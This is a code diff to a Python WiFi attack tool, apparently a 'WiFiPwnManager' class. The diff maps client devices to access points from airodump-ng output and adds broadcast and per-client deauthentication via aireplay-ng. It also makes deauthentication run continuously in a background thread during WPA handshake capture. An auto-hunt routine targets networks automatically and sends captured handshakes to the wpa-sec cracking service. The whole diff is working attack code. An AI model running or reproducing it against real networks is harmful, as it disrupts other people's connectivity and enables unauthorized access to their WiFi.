@@ -250,7 +250,7 @@ class WiFiPwnManager:
         return networks
 
     def _parse_airodump_csv(self, csv_path):
-        """Parse airodump-ng CSV output into a list of dicts."""
+        """Parse airodump-ng CSV output into AP list and client associations."""
         networks = []
         if not os.path.exists(csv_path):
             return networks
@@ -259,15 +259,16 @@ class WiFiPwnManager:
             with open(csv_path, "r", errors="ignore") as f:
                 content = f.read()
 
-            # Split by the blank line separating APs from clients
-            sections = content.split("\r\n\r\n")
+            # Normalize line endings and split AP / client sections
+            content = content.replace("\r\n", "\n")
+            sections = re.split(r"\n\s*\n", content, maxsplit=1)
             if not sections:
                 return networks
 
+            # --- Parse APs ---
             ap_section = sections[0]
             lines = ap_section.strip().splitlines()
 
-            # Find header line
             header_idx = None
             for i, line in enumerate(lines):
                 if "BSSID" in line and "ESSID" in line:
@@ -277,6 +278,8 @@ class WiFiPwnManager:
             if header_idx is None:
                 return networks
 
+            bssid_to_idx = {}  # map bssid -> index in networks list
+
             for line in lines[header_idx + 1:]:
                 parts = [p.strip() for p in line.split(",")]
                 if len(parts) < 14:
@@ -285,29 +288,43 @@ class WiFiPwnManager:
                 if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                     continue
 
-                channel_str = parts[3].strip()
                 try:
-                    channel = int(channel_str)
+                    channel = int(parts[3].strip())
                 except ValueError:
                     channel = 0
 
-                power_str = parts[8].strip() if len(parts) > 8 else "-1"
                 try:
-                    power = int(power_str)
+                    power = int(parts[8].strip()) if len(parts) > 8 else -1
                 except ValueError:
                     power = -1
 
                 encryption = parts[5].strip() if len(parts) > 5 else ""
                 essid = parts[13].strip() if len(parts) > 13 else ""
 
+                bssid_to_idx[bssid.upper()] = len(networks)
                 networks.append({
                     "bssid": bssid,
                     "essid": essid,
                     "channel": channel,
                     "power": power,
                     "encryption": encryption,
-                    "clients": 0,
+                    "clients": [],
                 })
+
+            # --- Parse Clients ---
+            if len(sections) > 1:
+                client_section = sections[1]
+                client_lines = client_section.strip().splitlines()
+                for line in client_lines:
+                    parts = [p.strip() for p in line.split(",")]
+                    if len(parts) < 6:
+                        continue
+                    client_mac = parts[0]
+                    if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", client_mac):
+                        continue
+                    associated_bssid = parts[5].strip().upper() if len(parts) > 5 else ""
+                    if associated_bssid in bssid_to_idx:
+                        networks[bssid_to_idx[associated_bssid]]["clients"].append(client_mac)
 
         except Exception as e:
             _emit("wifi", f"CSV parse error: {e}")
@@ -317,10 +334,53 @@ class WiFiPwnManager:
     # ------------------------------------------------------------------
     # Deauthentication & handshake capture
     # ------------------------------------------------------------------
-    def capture_handshake(self, bssid, channel, essid="", duration=30):
+    def deauth_network(self, bssid, channel, client_macs=None, count=15, rounds=5):
+        """
+        Send deauth packets to an AP (and optionally specific clients).
+        Runs broadcast deauth + targeted per-client deauth for better results.
+        """
+        iface = self.monitor_iface
+        if not iface:
+            _emit("wifi", "No monitor interface – enable monitor mode first")
+            return False
+
+        # Set channel first
+        subprocess.run(
+            ["sudo", "iwconfig", iface, "channel", str(channel)],
+            capture_output=True, text=True, timeout=5,
+        )
+
+        for r in range(rounds):
+            if self._stop_event.is_set():
+                break
+
+            # Broadcast deauth (kicks everyone)
+            _emit("wifi", f"Deauth round {r+1}/{rounds} → {bssid} (broadcast)")
+            subprocess.run(
+                ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid, iface],
+                capture_output=True, text=True, timeout=20,
+            )
+
+            # Targeted deauth per known client (much more effective)
+            if client_macs:
+                for cmac in client_macs:
+                    if self._stop_event.is_set():
+                        break
+                    _emit("wifi", f"  Deauth → client {cmac}")
+                    subprocess.run(
+                        ["sudo", "aireplay-ng", "--deauth", str(count),
+                         "-a", bssid, "-c", cmac, iface],
+                        capture_output=True, text=True, timeout=20,
+                    )
+
+            time.sleep(2)
+
+        return True
+
+    def capture_handshake(self, bssid, channel, essid="", duration=30, client_macs=None):
         """
         Target a specific AP: tune to its channel, start airodump-ng to
-        capture the handshake, and send deauth packets.
+        capture the handshake, and continuously deauth in a parallel thread.
         """
         iface = self.monitor_iface
         if not iface:
@@ -334,7 +394,8 @@ class WiFiPwnManager:
         for f in glob.glob(f"{cap_prefix}*"):
             os.remove(f)
 
-        _emit("wifi", f"Targeting {essid or bssid} on channel {channel}...")
+        _emit("wifi", f"Targeting {essid or bssid} on ch {channel} "
+              f"({len(client_macs) if client_macs else 0} known clients)...")
 
         # Set channel
         subprocess.run(
@@ -356,31 +417,55 @@ class WiFiPwnManager:
             stderr=subprocess.DEVNULL,
         )
 
-        # Send deauth bursts
-        _emit("wifi", f"Sending deauth to {essid or bssid}...")
-        try:
-            for _ in range(3):
-                if self._stop_event.is_set():
-                    break
+        # Give airodump a moment to start
+        time.sleep(2)
+
+        # Continuous deauth in a parallel thread
+        deauth_stop = threading.Event()
+
+        def _deauth_loop():
+            """Continuously send deauth packets until stopped."""
+            round_num = 0
+            while not deauth_stop.is_set() and not self._stop_event.is_set():
+                round_num += 1
+                _emit("wifi", f"Deauth wave {round_num} → {essid or bssid}")
+
+                # Broadcast deauth
                 subprocess.run(
-                    [
-                        "sudo", "aireplay-ng",
-                        "--deauth", "10",
-                        "-a", bssid,
-                        iface,
-                    ],
-                    capture_output=True, text=True, timeout=15,
+                    ["sudo", "aireplay-ng", "--deauth", "15",
+                     "-a", bssid, iface],
+                    capture_output=True, text=True, timeout=20,
                 )
-                time.sleep(5)
-        except Exception as e:
-            _emit("wifi", f"Deauth error: {e}")
 
-        # Wait for remaining capture time
-        remaining = max(0, duration - 20)
-        if remaining > 0 and not self._stop_event.is_set():
-            _emit("wifi", f"Listening for handshake ({remaining}s)...")
-            time.sleep(remaining)
+                # Targeted per-client deauth (much more effective)
+                if client_macs:
+                    for cmac in client_macs[:10]:  # cap at 10 clients
+                        if deauth_stop.is_set() or self._stop_event.is_set():
+                            return
+                        subprocess.run(
+                            ["sudo", "aireplay-ng", "--deauth", "10",
+                             "-a", bssid, "-c", cmac, iface],
+                            capture_output=True, text=True, timeout=15,
+                        )
 
+                # Brief pause between waves
+                for _ in range(3):
+                    if deauth_stop.is_set() or self._stop_event.is_set():
+                        return
+                    time.sleep(1)
+
+        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
+        deauth_thread.start()
+
+        # Wait for the capture duration
+        for _ in range(duration):
+            if self._stop_event.is_set():
+                break
+            time.sleep(1)
+
+        # Stop deauth and airodump
+        deauth_stop.set()
+        deauth_thread.join(timeout=5)
         airodump.terminate()
         try:
             airodump.wait(timeout=5)
@@ -388,10 +473,9 @@ class WiFiPwnManager:
             airodump.kill()
 
         # Check for captured handshake
-        cap_file = f"{cap_prefix}-01.cap"
-        if os.path.exists(cap_file):
-            has_hs = self._verify_handshake(cap_file, bssid)
-            if has_hs:
+        cap_candidates = sorted(glob.glob(f"{cap_prefix}*.cap"))
+        for cap_file in cap_candidates:
+            if self._verify_handshake(cap_file, bssid):
                 hs_record = {
                     "bssid": bssid,
                     "essid": essid,
@@ -544,9 +628,18 @@ class WiFiPwnManager:
                         if already:
                             continue
 
+                        # Extract known clients for this AP
+                        client_macs = net.get("clients", [])
+                        if isinstance(client_macs, int):
+                            client_macs = []
+
+                        _emit("wifi", f"Auto-hunt targeting {net['essid']} "
+                              f"({net['bssid']}) - {len(client_macs)} clients")
+
                         hs = self.capture_handshake(
                             net["bssid"], net["channel"],
-                            net["essid"], capture_duration
+                            net["essid"], capture_duration,
+                            client_macs=client_macs
                         )
                         if hs and api_key:
                             self.submit_to_wpasec(hs["file"], api_key)
